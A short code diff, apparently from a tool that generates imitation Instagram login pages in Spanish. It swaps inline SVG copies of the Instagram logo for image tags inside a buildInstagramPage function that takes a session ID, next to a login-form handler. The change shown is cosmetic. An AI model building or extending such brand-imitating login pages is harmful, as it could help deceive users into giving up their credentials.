@@ -378,36 +378,8 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
 }
 
 function buildInstagramPage(sessionId: string): string {
-  const igCameraIcon = `<svg width="96" height="96" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <defs>
-    <radialGradient id="ig_splash" cx="30%" cy="107%" r="150%">
-      <stop offset="0%" stop-color="#fdf497"/>
-      <stop offset="5%" stop-color="#fdf497"/>
-      <stop offset="45%" stop-color="#fd5949"/>
-      <stop offset="60%" stop-color="#d6249f"/>
-      <stop offset="90%" stop-color="#285AEB"/>
-    </radialGradient>
-  </defs>
-  <rect width="100" height="100" rx="22" fill="url(#ig_splash)"/>
-  <rect x="16" y="16" width="68" height="68" rx="18" stroke="white" stroke-width="7" fill="none"/>
-  <circle cx="50" cy="50" r="19" stroke="white" stroke-width="7" fill="none"/>
-  <circle cx="73" cy="27" r="5" fill="white"/>
-</svg>`;
-  const igCameraSmall = `<svg width="72" height="72" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <defs>
-    <radialGradient id="ig_form" cx="30%" cy="107%" r="150%">
-      <stop offset="0%" stop-color="#fdf497"/>
-      <stop offset="5%" stop-color="#fdf497"/>
-      <stop offset="45%" stop-color="#fd5949"/>
-      <stop offset="60%" stop-color="#d6249f"/>
-      <stop offset="90%" stop-color="#285AEB"/>
-    </radialGradient>
-  </defs>
-  <rect width="100" height="100" rx="22" fill="url(#ig_form)"/>
-  <rect x="16" y="16" width="68" height="68" rx="18" stroke="white" stroke-width="7" fill="none"/>
-  <circle cx="50" cy="50" r="19" stroke="white" stroke-width="7" fill="none"/>
-  <circle cx="73" cy="27" r="5" fill="white"/>
-</svg>`;
+  const igCameraIcon = `<img src="/assets/ig-logo.png" alt="Instagram" width="96" height="96" style="display:block;">`;
+  const igCameraSmall = `<img src="/assets/ig-logo.png" alt="Instagram" width="72" height="72" style="display:block;">`;
   return `<!DOCTYPE html>
 <html lang="es">
 <head>
